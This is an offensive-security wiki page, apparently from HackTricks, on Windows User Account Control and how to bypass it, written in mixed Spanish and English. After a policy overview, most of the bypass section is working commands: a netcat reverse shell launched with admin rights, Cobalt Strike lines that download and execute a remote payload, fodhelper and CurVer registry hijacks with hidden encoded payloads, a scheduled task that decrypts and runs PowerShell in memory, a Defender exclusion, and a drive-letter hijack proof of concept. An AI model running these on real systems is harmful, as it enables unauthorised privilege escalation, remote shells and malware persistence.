# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una característica que habilita un **prompt de consentimiento para actividades elevadas**. Las aplicaciones tienen diferentes niveles de `integrity`, y un programa con un **nivel high** puede realizar tareas que **podrían comprometer potencialmente el sistema**. Cuando UAC está habilitado, las aplicaciones y tareas siempre **se ejecutan bajo el contexto de seguridad de una cuenta no administradora** a menos que un administrador autorice explícitamente que esas aplicaciones/tareas tengan acceso a nivel administrador para ejecutarse. Es una funcionalidad de conveniencia que protege a los administradores de cambios no intencionados, pero no se considera un límite de seguridad.

Para más información sobre los niveles de integrity:

{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Cuando UAC está en funcionamiento, a un usuario administrador se le dan 2 tokens: una clave de usuario estándar, para realizar acciones regulares a nivel normal, y otra con los privilegios de administrador.

Esta [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) explica en profundidad cómo funciona UAC e incluye el proceso de logon, la experiencia del usuario y la arquitectura de UAC. Los administradores pueden usar políticas de seguridad para configurar cómo funciona UAC específico para su organización a nivel local (usando secpol.msc), o configurarlo y desplegarlo vía Group Policy Objects (GPO) en un entorno de dominio Active Directory. Las distintas configuraciones se describen en detalle [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Hay 10 configuraciones de Group Policy que se pueden establecer para UAC. La siguiente tabla proporciona más detalle:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Políticas para instalar software en Windows

Las **políticas de seguridad locales** ("secpol.msc" en la mayoría de los sistemas) están configuradas por defecto para **impedir que usuarios no administradores realicen instalaciones de software**. Esto significa que incluso si un usuario no administrador puede descargar el instalador de tu software, no podrá ejecutarlo sin una cuenta de administrador.

### Claves del Registro para forzar que UAC pida elevación

Como usuario estándar sin permisos de administrador, puedes asegurarte de que la cuenta "standard" sea **solicitada por UAC para introducir credenciales** cuando intente realizar ciertas acciones. Esta acción requeriría modificar ciertas **claves del registro**, para lo cual necesitas permisos de administrador, a menos que exista un UAC bypass, o el atacante ya esté logueado como admin.

Incluso si el usuario está en el grupo Administrators, estos cambios obligan al usuario a **reingresar las credenciales de su cuenta** para poder realizar acciones administrativas.

**La única desventaja es que este método necesita que UAC esté deshabilitado para funcionar, lo cual es improbable en entornos de producción.**

Las claves y entradas del registro que debes cambiar son las siguientes (con sus valores por defecto entre paréntesis):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Esto también se puede hacer manualmente mediante la herramienta Local Security Policy. Una vez cambiadas, las operaciones administrativas solicitan al usuario que reingrese sus credenciales.

### Nota

**User Account Control is not a security boundary.** Por lo tanto, los usuarios estándar no pueden escapar de sus cuentas y obtener derechos de administrador sin un local privilege escalation exploit.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Privilegios de UAC

- Internet Explorer Protected Mode utiliza comprobaciones de integridad para evitar que procesos de alto nivel de integridad (como navegadores web) accedan a datos de bajo nivel de integridad (como la carpeta de archivos temporales de Internet). Esto se consigue ejecutando el navegador con un token de baja integridad. Cuando el navegador intenta acceder a datos almacenados en la zona de baja integridad, el sistema operativo verifica el nivel de integridad del proceso y permite el acceso en consecuencia. Esta característica ayuda a prevenir que ataques de ejecución remota de código obtengan acceso a datos sensibles del sistema.
- Cuando un usuario inicia sesión en Windows, el sistema crea un token de acceso que contiene una lista de los privilegios del usuario. Los privilegios se definen como la combinación de los derechos y capacidades de un usuario. El token también contiene una lista de las credenciales del usuario, que son credenciales que se usan para autenticar al usuario en el equipo y en los recursos de la red.

### Autoadminlogon

To configure Windows to automatically log on a specific user at startup, set the **`AutoAdminLogon` registry key**. This is useful for kiosk environments or for testing purposes. Use this only on secure systems, as it exposes the password in the registry.

Set the following keys using the Registry Editor or `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

To revert to normal logon behavior, set `AutoAdminLogon` to 0.

## UAC bypass

> [!TIP]
> Note that if you have graphical access to the victim, UAC bypass is straight forward as you can simply click on "Yes" when the UAC prompt appears

The UAC bypass is needed in the following situation: **the UAC is activated, your process is running in a medium integrity context, and your user belongs to the administrators group**.

It is important to mention that it is **much harder to bypass the UAC if it is in the highest security level (Always) than if it is in any of the other levels (Default).**

### UAC disabled

If UAC is already disabled (`ConsentPromptBehaviorAdmin` is **`0`**) you can **execute a reverse shell with admin privileges** (high integrity level) using something like:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Muy** Básico UAC "bypass" (acceso completo al sistema de archivos)

Si tienes una shell con un usuario que está en el grupo Administrators puedes **montar el recurso compartido C$** vía SMB (sistema de archivos) localmente en un nuevo disco y tendrás **acceso a todo el sistema de archivos** (incluso la carpeta personal de Administrator).

> [!WARNING]
> **Parece que este truco ya no funciona**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass con cobalt strike

Las técnicas de Cobalt Strike solo funcionarán si UAC no está configurado en su nivel máximo de seguridad
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** y **Metasploit** también tienen varios módulos para **bypass** del **UAC**.

### KRBUACBypass

Documentación y herramienta en [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) que es una **compilación** de varios exploits de bypass de UAC. Ten en cuenta que necesitarás **compilar UACME usando visual studio o msbuild**. La compilación creará varios ejecutables (como `Source\Akagi\outout\x64\Debug\Akagi.exe`) , deberás saber **cuál necesitas.**\
Debes **tener cuidado** porque algunos bypasses harán que otros programas muestren avisos que **alertarán** al **usuario** de que algo está ocurriendo.

UACME indica la **build a partir de la cual** cada técnica empezó a funcionar. Puedes buscar una técnica que afecte tus versiones:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Además, usando [this](https://en.wikipedia.org/wiki/Windows_10_version_history) página obtienes la versión de Windows `1607` a partir de los números de compilación.

### UAC Bypass – fodhelper.exe (Registry hijack)

El binario de confianza `fodhelper.exe` se autoeleva en Windows modernos. Al lanzarlo, consulta la ruta de registro por usuario que aparece abajo sin validar el verbo `DelegateExecute`. Plantar un comando allí permite que un proceso en Medium Integrity (el usuario está en Administrators) inicie un proceso en High Integrity sin un UAC prompt.

Ruta de registro consultada por fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Pasos de PowerShell (configura tu payload, luego trigger)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notas:
- Funciona cuando el usuario actual es miembro de Administrators y el nivel de UAC es predeterminado/permisivo (no Always Notify con restricciones adicionales).
- Usa la ruta `sysnative` para iniciar un PowerShell de 64 bits desde un proceso de 32 bits en Windows de 64 bits.
- El payload puede ser cualquier comando (PowerShell, cmd o la ruta de un EXE). Evita UIs que muestren prompts para mantener el sigilo.

#### CurVer/extension hijack variante (solo HKCU)

Muestras recientes que abusan de `fodhelper.exe` evitan `DelegateExecute` y en su lugar **redirigen el ProgID `ms-settings`** vía el valor por usuario `CurVer`. El binario auto-elevado aún resuelve el manejador bajo `HKCU`, por lo que no se necesita un token de admin para plantar las claves:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Una vez elevado, el malware comúnmente **desactiva las solicitudes futuras** estableciendo `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` a `0`, luego realiza evasión adicional de defensas (p. ej., `Add-MpPreference -ExclusionPath C:\ProgramData`) y recrea persistencia para ejecutarse con integridad elevada. Una tarea de persistencia típica almacena un **XOR-encrypted PowerShell script** en disco y lo decodifica/ejecuta en memoria cada hora:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Esta variante aún limpia el dropper y deja solo los staged payloads, haciendo que la detección dependa de monitorizar el **`CurVer` hijack**, la manipulación de `ConsentPromptBehaviorAdmin`, la creación de exclusiones en Defender, o las tareas programadas que desencriptan PowerShell en memoria.

#### Más UAC bypass

**Todas** las técnicas usadas aquí para bypassear UAC **requieren** una **shell interactiva completa** con la víctima (una shell común nc.exe no es suficiente).

Puedes conseguirlo usando una sesión **meterpreter**. Migra a un **proceso** que tenga el valor **Session** igual a **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ debería funcionar)

### Bypass de UAC con GUI

Si tienes acceso a una **GUI puedes simplemente aceptar el UAC prompt** cuando aparezca; en realidad no necesitas un bypass. Por tanto, obtener acceso a una GUI te permitirá eludir UAC.

Además, si obtienes una sesión GUI que alguien estaba usando (potencialmente vía RDP) hay **algunas herramientas que estarán ejecutándose como administrador** desde las que podrías **ejecutar** un **cmd**, por ejemplo **como admin** directamente sin que UAC vuelva a preguntar, como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Esto puede ser algo más **sigiloso**.

### Bypass ruidoso de UAC por fuerza bruta

Si no te importa ser ruidoso siempre podrías **ejecutar algo como** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) que **pide elevar permisos hasta que el usuario lo acepte**.

### Tu propio bypass - Metodología básica para bypassear UAC

Si miras **UACME** notarás que **la mayoría de los bypass de UAC abusan de una vulnerabilidad de Dll Hijacking** (principalmente escribiendo la dll maliciosa en _C:\Windows\System32_). [Lee esto para aprender cómo encontrar una vulnerabilidad de Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Encuentra un binario que **autoelevate** (comprueba que al ejecutarlo se ejecuta en un nivel de integridad alto).
2. Con procmon busca eventos "**NAME NOT FOUND**" que puedan ser vulnerables a **DLL Hijacking**.
3. Probablemente necesitarás **escribir** la DLL dentro de algunas **rutas protegidas** (como C:\Windows\System32) donde no tienes permisos de escritura. Puedes eludir esto usando:
   1. **wusa.exe**: Windows 7, 8 y 8.1. Permite extraer el contenido de un archivo CAB dentro de rutas protegidas (porque esta herramienta se ejecuta en un nivel de integridad alto).
   2. **IFileOperation**: Windows 10.
4. Prepara un **script** para copiar tu DLL dentro de la ruta protegida y ejecutar el binario vulnerable y autoelevado.

### Otra técnica de bypass de UAC

Consiste en vigilar si un **autoElevated binary** intenta **leer** del **registro** el **nombre/ruta** de un **binary** o **command** que vaya a ser **ejecutado** (esto es más interesante si el binario busca esta información dentro de **HKCU**).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” utiliza shadow-admin tokens con mapas per-session `\Sessions\0\DosDevices/<LUID>`. El directorio se crea perezosamente por `SeGetTokenDeviceMap` en la primera resolución de `\??`. Si el atacante se hace pasar por el shadow-admin token solo en **SecurityIdentification**, el directorio se crea con el atacante como **owner** (hereda `CREATOR OWNER`), permitiendo drive-letter links que tienen prioridad sobre `\GLOBAL??`.

**Pasos:**

1. Desde una sesión con pocos privilegios, llama a `RAiProcessRunOnce` para lanzar un promptless shadow-admin `runonce.exe`.
2. Duplica su token primario a un **identification** token e impersona el token mientras abres `\??` para forzar la creación de `\Sessions\0\DosDevices/<LUID>` bajo la propiedad del atacante.
3. Crea allí un symlink `C:` que apunte a un almacenamiento controlado por el atacante; los accesos posteriores al sistema de archivos en esa sesión resuelven `C:` hacia la ruta del atacante, habilitando DLL/file hijack sin prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Referencias
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – pasos de fodhelper UAC bypass](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – Cómo funciona User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – colección de técnicas de UAC bypass](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI adopta AI para generar backdoors de PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
